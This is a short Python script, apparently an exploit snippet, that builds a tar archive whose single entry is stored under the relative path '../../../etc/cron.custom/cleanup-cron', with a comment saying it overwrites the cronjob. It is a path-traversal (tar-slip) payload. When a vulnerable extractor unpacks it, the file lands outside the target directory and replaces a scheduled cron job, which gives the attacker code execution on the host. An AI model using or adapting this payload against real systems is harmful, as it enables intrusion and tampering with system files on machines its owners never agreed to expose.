import tarfile
import os

# Overwrite the cronjob
with tarfile.open('write.tar', 'w') as tar:
    tar.add('cronjob.txt', arcname='../../../etc/cron.custom/cleanup-cron') 


